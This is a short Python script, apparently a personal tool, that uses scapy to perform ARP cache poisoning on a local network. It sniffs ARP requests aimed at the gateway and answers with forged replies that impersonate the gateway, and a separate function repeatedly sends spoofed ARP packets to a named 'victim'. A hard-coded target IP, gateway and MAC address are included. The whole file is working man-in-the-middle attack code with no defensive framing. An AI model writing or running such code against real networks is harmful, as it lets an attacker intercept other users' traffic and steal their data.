import threading
import time

import scapy.all as scapy
from scapy.layers.l2 import ARP
from utils import get_local_ip, get_gateway_ip

has_tracker_stopped = False
victims_data_by_ips = {}
thread_stops_flags = {}


def get_track_state():
    return has_tracker_stopped


def change_track_state(value: bool):
    global has_tracker_stopped
    has_tracker_stopped = value


def victim_caught(victim_ip, victim_mac, gateway_ip, my_mac):
    """
    :param victim_ip:
    :param gateway_ip:
    :param victim_mac:
    :param my_mac:
    :return:
    """
    arp_segment = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, hwsrc=my_mac, psrc=gateway_ip)
    scapy.send(arp_segment)
    time.sleep(1)
    scapy.send(arp_segment)
    time.sleep(1)
    scapy.send(arp_segment)
    time.sleep(1)
    scapy.send(arp_segment)


def handles_arp_requests(packet, gateway_ip, local_mac):
    """ Arp Cache poisoning """
    if ARP in packet and packet[ARP].pdst == gateway_ip and (packet[ARP].psrc == "192.168.1.106"):
        if victims_data_by_ips.get(packet[ARP].psrc) is None:
            arp_segment = ARP(op=2, hwdst=packet[ARP].hwsrc, pdst=packet[ARP].psrc, hwsrc=local_mac, psrc=gateway_ip)
            scapy.send(arp_segment)
            # victims_data_by_ips[packet[ARP].psrc] = {}
            print(packet[ARP].psrc)


def track_victims(gateway_ip, local_mac):
    """ Sniffing Arp requests """
    arp_handler = lambda packet: handles_arp_requests(packet, gateway_ip, local_mac)
    scapy.sniff(filter=f"arp and arp[6:2] = 1", prn=arp_handler)


def main():
    # LOCAL_IP = get_local_ip()
    LOCAL_MAC = "98:43:fa:93:1e:26"
    # GATEWAY_IP = get_gateway_ip()
    GATEWAY_IP = "192.168.1.1"
    # GATEWAY_MAC = "5c-b1-3e-55-08-bc"

    tracker_thread = threading.Thread(target=track_victims, daemon=True, args=[GATEWAY_IP, LOCAL_MAC])
    tracker_thread.start()
    try:
        while True and not has_tracker_stopped:
            time.sleep(1)
    except KeyboardInterrupt | InterruptedError:
        tracker_thread.join()  # stops the tracking


if __name__ == '__main__':
    main()
